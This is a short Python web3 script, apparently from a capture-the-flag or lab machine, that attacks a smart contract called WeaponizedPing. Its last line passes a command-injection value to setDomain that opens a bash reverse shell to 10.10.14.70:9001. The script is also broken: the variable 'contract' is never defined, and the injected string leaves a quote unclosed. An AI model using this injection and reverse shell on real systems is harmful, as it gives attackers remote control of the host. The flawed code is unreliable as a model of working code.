from web3 import Web3, HTTPProvider
import json

# Load Config
contract_address = '0xB8c81c3AFa3a27DBFd7285dA792b107BE3aacCC8'
contract_data = json.loads(open("WeaponizedPing.json", "r").read())
abi = contract_data['abi']

# Establish Connection
w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))

# Print Domain
print(contract.functions.getDomain().call())

# Get shell
contract.functions.setDomain("10.10.14.70; bash -c 'bash -i >& /dev/tcp/10.10.14.70/9001 0>&1").transact()

